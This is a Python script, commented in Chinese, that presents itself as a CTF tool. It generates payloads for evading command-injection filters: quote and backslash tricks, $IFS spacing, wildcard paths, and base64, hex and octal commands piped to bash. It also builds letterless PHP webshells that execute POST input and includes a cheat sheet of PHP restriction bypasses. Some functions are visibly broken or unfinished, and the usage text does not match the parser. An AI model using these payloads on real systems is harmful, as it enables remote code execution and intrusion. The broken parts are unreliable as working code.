#!/usr/bin/env python3
"""
CTF 命令执行绕过生成器 (web_rce_bypass.py)
===========================================
针对竞赛中常见的命令执行过滤场景，自动生成绕过 payload：
1. 关键字过滤绕过（cat → ca\t, c''at, $IFS 等）
2. 空格过滤绕过（$IFS, ${IFS}, <, %09 等）
3. 路径过滤绕过（/bin/cat → /???/??t）
4. 编码绕过（八进制/十六进制/base64）
5. 无字母数字 Webshell（自增/异或/取反）

核心依赖: 无（纯 Python 标准库）

使用方式:
  # 生成 "cat /flag" 的所有绕过 payload
  python web_rce_bypass.py -c "cat /flag"

  # 只生成特定类型的绕过
  python web_rce_bypass.py -c "cat /flag" --type keyword,encoding

  # 生成无字母数字 PHP Webshell
  python web_rce_bypass.py --webshell --cmd "system('id');"

  # 生成分块传输绕过
  python web_rce_bypass.py -c "cat /flag" --chunked

比赛时输入要执行的命令即可自动生成各种绕过方式。
"""

import argparse
import base64
import sys
import re
import random

# ============================================================
# 命令执行绕过技术
# ============================================================

def bypass_keyword(cmd):
    """
    关键字过滤绕过。
    适用于: cat, ls, flag, bash 等关键字被过滤。
    """
    results = []

    # 方法1: 插入引号 (c''at → cat)
    # 在关键字中间插入空引号
    keywords = ['cat', 'flag', 'tac', 'nl', 'more', 'less', 'head', 'tail',
                'bash', 'sh', 'curl', 'wget', 'nc', 'python', 'php',
                'sort', 'strings', 'grep', 'find', 'ls', 'dir']
    modified = cmd
    for kw in keywords:
        if kw in modified:
            # 在中间插入 ''
            mid = len(kw) // 2
            if mid > 0:
                replaced = kw[:mid] + "''" + kw[mid:]
                modified = modified.replace(kw, replaced)
                break
    results.append(('引号插入', modified))

    # 方法2: 反斜杠连接 (ca\t → cat)
    modified = cmd
    for kw in keywords:
        if kw in modified and len(kw) > 1:
            mid = len(kw) // 2
            if mid > 0:
                replaced = kw[:mid] + '\\' + kw[mid:]
                modified = modified.replace(kw, replaced)
                break
    results.append(('反斜杠连接', modified))

    # 方法3: 变量拼接 (a=c;b=at;$a$b → cat)
    # 找到第一个需要绕过的关键字
    for kw in keywords:
        if kw in cmd:
            # 使用变量拼接
            parts = []
            remaining = cmd
            if kw in remaining:
                idx = remaining.index(kw)
                parts.append(remaining[:idx])
                # 拆分关键字: ca + t
                mid = len(kw) // 2 or 1
                var_name = 'a'
                var_name2 = 'b'
                parts.append(f'{var_name}={kw[:mid]};{var_name2}={kw[mid:]};${var_name}${var_name2}')
                parts.append(remaining[idx + len(kw):])
                modified = ''.join(parts)
                results.append(('变量拼接', modified))
                break

    # 方法4: 大小写绕过 (CAT → cat)
    for kw in keywords:
        if kw in cmd:
            modified = cmd.replace(kw, kw.upper())
            results.append(('大小写', modified))
            modified = cmd.replace(kw, kw.capitalize())
            results.append(('首字母大写', modified))
            break

    # 方法5: $() 命令替换构造关键字
    for kw in keywords:
        if kw in cmd:
            # echo "cat" | 命令替换
            modified = cmd.replace(kw, f'$(echo {kw})')
            results.append(('$()命令替换', modified))
            break

    # 方法6: 空变量 $@ 绕过 (ca$@t → cat)
    for kw in keywords:
        if kw in cmd and len(kw) > 1:
            mid = len(kw) // 2
            if mid > 0:
                modified = cmd.replace(kw, kw[:mid] + '$@' + kw[mid:])
                results.append(('$@插入', modified))
                break

    return results


def bypass_space(cmd):
    """
    空格过滤绕过。
    适用于: 空格被过滤的场景。
    """
    results = []

    # $IFS
    modified = cmd.replace(' ', '$IFS')
    results.append(('$IFS', modified))

    # ${IFS}
    modified = cmd.replace(' ', '${IFS}')
    results.append(('${IFS}', modified))

    # $IFS$9 (防止变量名粘连)
    modified = cmd.replace(' ', '$IFS$9')
    results.append(('$IFS$9', modified))

    # < 重定向
    parts = cmd.split(' ', 1)
    if len(parts) == 2:
        modified = f'{parts[0]}<{parts[1]}'
        results.append(('<重定向', modified))

    # {} 花括号
    parts = cmd.split(' ')
    if len(parts) >= 2:
        modified = '{' + ','.join(parts) + '}'
        results.append(('花括号{{}}', modified))

    # %09 (Tab，URL中)
    modified = cmd.replace(' ', '%09')
    results.append(('Tab(%09)', modified))

    # $IFS$1
    modified = cmd.replace(' ', '$IFS$1')
    results.append(('$IFS$1', modified))

    # 换行符
    modified = cmd.replace(' ', '\n')
    results.append(('换行符', modified))

    return results


def bypass_path(cmd):
    """
    路径过滤绕过: 用通配符 ? * 替代字符。
    /bin/cat → /???/??t
    /flag → /???g 或 /f*
    """
    results = []

    modified = cmd

    # /bin/cat → /???/??t
    modified = modified.replace('/bin/cat', '/???/??t')
    modified = modified.replace('/bin/ls', '/???/??')
    modified = modified.replace('/bin/tac', '/???/??c')
    modified = modified.replace('/bin/nl', '/???/??')
    modified = modified.replace('/bin/sort', '/???/???t')
    modified = modified.replace('/usr/bin/', '/???/???/')

    # /flag → /???g
    if '/flag' in modified:
        modified = modified.replace('/flag', '/f???')
        results.append(('通配符?', modified))
    elif '/flag' in cmd:
        modified2 = cmd.replace('/flag', '/f*')
        results.append(('通配符*', modified2))

    # 通用: 路径中的每个字母用 ? 替代
    paths = re.findall(r'/[a-zA-Z0-9_/]+', cmd)
    for path in paths:
        # 只对长度 >= 3 的路径做通配
        if len(path) >= 3:
            # 保留最后一个字符，其余用 ? 替代
            wildcard_path = re.sub(r'[a-zA-Z0-9]', '?', path[:-1]) + path[-1]
            # 更简单的做法
            parts = path.split('/')
            wildcard_parts = []
            for part in parts:
                if len(part) > 1:
                    wildcard_parts.append('?' * (len(part) - 1) + part[-1])
                elif part:
                    wildcard_parts.append(part)
            wildcard = '/'.join(wildcard_parts)
            modified2 = cmd.replace(path, wildcard)
            if modified2 != cmd:
                results.append(('路径通配符', modified2))
                break

    if not results:
        # 更直接的通配
        modified2 = cmd.replace('/', '/').replace('cat', '??t')
        results.append(('简单通配', modified2))

    return results


def bypass_encoding(cmd):
    """
    编码绕过。
    适用于: 大量关键字被过滤。
    """
    results = []

    # Base64 编码
    b64 = base64.b64encode(cmd.encode()).decode()
    results.append(('Base64', f'echo {b64}|base64 -d|bash'))

    # Base64 + 变量
    results.append(('Base64+变量', f'echo {b64}|base64 -d|/bin/sh'))

    # 十六进制编码
    hex_str = cmd.encode().hex()
    hex_formatted = '\\x' + '\\x'.join(hex_str[i:i+2] for i in range(0, len(hex_str), 2))
    results.append(('十六进制(printf)', f'printf "{hex_formatted}"|bash'))

    # 八进制编码
    oct_str = ''.join(f'\\{oct(ord(c))[2:]}' for c in cmd)
    results.append(('八进制(printf)', f'printf "{oct_str}"|bash'))

    # 十六进制 (\x) 直接执行
    hex_exec = ''.join(f'\\x{ord(c):02x}' for c in cmd)
    results.append(('十六进制(直接)', f'$(printf "{hex_exec}")'))

    # $0 方式: /bin/sh 执行
    results.append(('$0执行', f'echo {b64}|base64 -d|$0'))

    # 十六进制命令
    hex_cmd = ' '.join(f'\\x{ord(c):02x}' for c in cmd)
    results.append(('十六进制(echo-e)', f'echo -e "{hex_cmd}"|sh'))

    return results


def bypass_combined(cmd):
    """
    组合绕过: 同时处理空格和关键字。
    """
    results = []

    # 空格用 $IFS + 关键字用变量拼接
    parts = cmd.split(' ')
    if len(parts) >= 2:
        # 空格用 $IFS
        modified = '$IFS'.join(parts)
        # 关键字用通配
        modified = modified.replace('cat', 'c""at')
        results.append(('组合(IFS+引号)', modified))

    # 全部用变量
    if 'cat' in cmd and '/flag' in cmd:
        results.append(('组合(变量+通配)', 'a=c;b=at;$a$b${IFS}/f???'))

    # echo 命令替换 + IFS
    if 'cat' in cmd:
        results.append(('组合(echo+IFS)', f'$(echo{chr(36)}IFS"cat"){chr(36)}IFS/f???'))

    # 使用 ${PATH} 截取字符
    # ${PATH:0:1} = /, ${PATH:1:1} = u 等
    # 这个比较复杂，只给个示例
    char_map = {
        '/': '${PATH:0:1}',
        'c': '${PATH:3:1}',  # /usr 中的 u... 实际依赖 PATH 值
    }
    # 不太可靠，给出提示
    results.append(('PATH截取(需调整)', '需要根据目标PATH值调整: ${PATH:offset:length}'))

    return results


# ============================================================
# PHP 无字母数字 Webshell
# ============================================================

def generate_php_webshell(cmd):
    """
    生成无字母数字的 PHP Webshell。
    利用异或、取反、自增等方式构造任意命令。
    """
    results = []

    # 方法1: 异或构造
    # $_ = ('`' ^ '?') 之类的方式构造字符
    # 经典: $_=('>'^'<');  等等
    results.append(('异或构造', _xor_webshell(cmd)))

    # 方法2: 取反构造
    results.append(('取反构造', _not_webshell(cmd)))

    # 方法3: 自增构造
    results.append(('自增构造', _incr_webshell(cmd)))

    # 方法4: URL 编码版取反 (最简短)
    results.append(('URL取反', _url_not_webshell(cmd)))

    return results


def _xor_webshell(cmd):
    """异或构造无字母数字 Webshell"""
    # 构造 $_POST[0] 作为执行函数
    # 经典 payload:
    # $_=('%01'^'`').('%13'^'`')... 构造 assert
    # 然后执行 $_($_POST[0])

    # 简化版: 构造 system
    target = 'system'
    xor_pairs = []
    for c in target:
        # 找两个不可见字符异或得到目标字符
        val = ord(c)
        # 用高位字符异或
        a = val ^ 0xFF  # a = ~c
        b = 0xFF
        xor_pairs.append(f"('{chr(a)}'^'{chr(b)}')")

    var_assign = "$_=" + '.'.join(xor_pairs) + ';'
    full_payload = f"{var_assign}$_(\"{cmd}\");"
    return full_payload


def _not_webshell(cmd):
    """取反构造无字母数字 Webshell"""
    target = 'system'
    not_chars = []
    for c in target:
        val = ~ord(c) & 0xFF
        # 用 \xNN 表示
        not_chars.append(f"'\\x{val:02x}'")

    var_assign = "$_=" + '|'.join(f"(~{ch})" for ch in not_chars) + ';'
    full_payload = f"{var_assign}$_(\"{cmd}\");"
    return full_payload


def _incr_webshell(cmd):
    """自增构造: 从空数组获取 'A'，自增得到其他字母"""
    # $_=[]; // array
    # $_=@"$_"; // "Array"
    # $_=$_['!'=='@']; // 'A'
    # 然后通过 ++$_ 自增得到其他字母
    # 这个比较复杂，给出框架

    # 构造 assert 或 system
    payload = (
        "$_=[];$_=@\"$_\";$_=$_['!'=='@'];"  # $_ = 'A'
        "$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;"  # 'A'+19 = 'T'
        # 太长了，给出简化版
    )
    # 简化: 直接给出构造 system 的思路
    return (
        "$_=[];\n"
        "$_=@\"$_\";\n"  # $_ = "Array"
        "$_=$_['!'=='@'];\n"  # $_ = 'A'\n"
        "# 通过 ++$_ 自增得到所需字母:\n"
        "# A(+18)=S, A(+18)+1=T, A(+32)=a, ...\n"
        "# 构造 system: s(=A+18) y(=A+24) s t e m\n"
        "# 然后执行 $_($cmd);"
    )


def _url_not_webshell(cmd):
    """URL 取反编码 (最短)"""
    target = f'phpinfo()'
    # 构造 ~'xxx' 形式
    encoded = ''
    for c in target:
        val = ~ord(c) & 0xFF
        encoded += f'\\x{val:02x}'

    # 更实用的: 构造 assert($_POST[0])
    target2 = 'assert'
    encoded2 = ''
    for c in target2:
        val = ~ord(c) & 0xFF
        encoded2 += f'\\x{val:02x}'

    return f"(~'\\x{encoded2}')($_POST['0']);"


# ============================================================
# 命令执行 Payload 速查表
# ============================================================

RCE_CHEATSHEET = """
============================================================
命令执行绕过 Payload 速查表
============================================================

【1. 命令分隔符】
  ;     分号分隔
  |     管道
  ||    逻辑或
  &&    逻辑与
  %0a   换行符
  %0d   回车符
  %0a%0d CRLF

【2. 空格绕过】
  $IFS        内部字段分隔符
  ${IFS}      同上
  $IFS$9      防止变量粘连
  $IFS$1      同上
  <           重定向: cat<flag
  <>          读写: cat<>flag
  {cat,flag}  花括号: cat flag
  %09         Tab
  %20         空格(URL)

【3. 关键字绕过】
  c""at      引号: cat
  c''at      单引号
  ca\\t      反斜杠
  c$@at      $@ 空参数
  $(echo cat) 命令替换
  CAT        大小写
  /???/??t   通配符: /bin/cat

【4. 编码绕过】
  echo Y2F0IC9mbGFn|base64 -d|bash    # base64
  printf "\\x63\\x61\\x74"|bash         # 十六进制
  printf "\\143\\141\\x74"|bash         # 八进制
  $(echo Y2F0IC9mbGFn|base64 -d)       # 命令替换

【5. 常见命令替换】
  cat → tac, nl, more, less, head, tail, sort, strings
  cat → rev (逆序输出)
  cat → paste, od, xxd, base64
  ls  → dir, find, echo *

【6. Linux 敏感文件读取】
  cat /flag
  cat /flag.txt
  cat /home/flag
  cat /root/flag
  find / -name flag 2>/dev/null
  ls / | grep flag

【7. PHP 限制绕过】
  disable_functions 绕过:
    - LD_PRELOAD (putemail + mail())
    - FFI (PHP 7.4+)
    - imap_open (PHP < 7.x)
    - pcntl_exec
    - iconv / GnuLoader
  
  open_basedir 绕过:
    - glob:// 协议列目录
    - chdir() + ini_set()
    - SplFileInfo

【8. 无字母数字 Webshell】
  异或: $_=('`'^'?').(...);$_($_POST[0]);
  取反: $_=(~'\\x8c\\x9a\\x9e\\x9b\\x99\\x96');$_($_POST[0]);
  自增: $_=[];$_=@"$_";$_=$_['!'=='@'];++$_;...

============================================================
"""


# ============================================================
# 命令行入口
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description='CTF \u547d\u4ee4\u6267\u884c\u7ed5\u8fc7\u751f\u6210\u5668',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
\u793a\u4f8b:
  # \u751f\u6210 "cat /flag" \u7684\u6240\u6709\u7ed5\u8fc7 payload
  python web_rce_bypass.py -c "cat /flag"

  # \u53ea\u751f\u6210\u7279\u5b9a\u7c7b\u578b
  python web_rce_bypass.py -c "cat /flag" --type keyword,encoding

  # \u751f\u6210\u65e0\u5b57\u6bcd\u6570\u5b57 PHP Webshell
  python web_rce_bypass.py --webshell --cmd "system('id');"

  # \u67e5\u770b\u901f\u67e5\u8868
  python web_rce_bypass.py cheatsheet
        """
    )

    parser.add_argument('-c', '--cmd', help='\u8981\u6267\u884c\u7684\u539f\u59cb\u547d\u4ee4')
    parser.add_argument('--type', default='all',
                        help='\u7ed5\u8fc7\u7c7b\u578b (keyword,space,path,encoding,combined,all)')
    parser.add_argument('--webshell', action='store_true', help='\u751f\u6210\u65e0\u5b57\u6bcd\u6570\u5b57 PHP Webshell')
    parser.add_argument('--cmd2', dest='webshell_cmd', help='Webshell \u8981\u6267\u884c\u7684\u547d\u4ee4')

    args = parser.parse_args()

    if 'cheatsheet' in sys.argv:
        print(RCE_CHEATSHEET)
        return

    if args.webshell:
        cmd = args.webshell_cmd or "system('id');"
        print(f"[*] \u751f\u6210\u65e0\u5b57\u6bcd\u6570\u5b57 Webshell \u6267\u884c: {cmd}\n")
        results = generate_php_webshell(cmd)
        for name, payload in results:
            print(f"  [{name}]")
            print(f"  {payload}\n")
        return

    if not args.cmd:
        parser.print_help()
        return

    cmd = args.cmd
    print(f"[*] \u539f\u59cb\u547d\u4ee4: {cmd}")
    print(f"[*] \u7ed5\u8fc7\u7c7b\u578b: {args.type}\n")

    types = args.type.split(',') if args.type != 'all' else ['keyword', 'space', 'path', 'encoding', 'combined']

    if 'keyword' in types:
        print("=" * 50)
        print("\u3010\u5173\u952e\u5b57\u7ed5\u8fc7\u3011")
        print("=" * 50)
        for name, payload in bypass_keyword(cmd):
            print(f"  [{name}] {payload}")
        print()

    if 'space' in types:
        print("=" * 50)
        print("\u3010\u7a7a\u683c\u7ed5\u8fc7\u3011")
        print("=" * 50)
        for name, payload in bypass_space(cmd):
            print(f"  [{name}] {payload}")
        print()

    if 'path' in types:
        print("=" * 50)
        print("\u3010\u8def\u5f84\u7ed5\u8fc7\u3011")
        print("=" * 50)
        for name, payload in bypass_path(cmd):
            print(f"  [{name}] {payload}")
        print()

    if 'encoding' in types:
        print("=" * 50)
        print("\u3010\u7f16\u7801\u7ed5\u8fc7\u3011")
        print("=" * 50)
        for name, payload in bypass_encoding(cmd):
            print(f"  [{name}] {payload}")
        print()

    if 'combined' in types:
        print("=" * 50)
        print("\u3010\u7ec4\u5408\u7ed5\u8fc7\u3011")
        print("=" * 50)
        for name, payload in bypass_combined(cmd):
            print(f"  [{name}] {payload}")
        print()


if __name__ == '__main__':
    main()
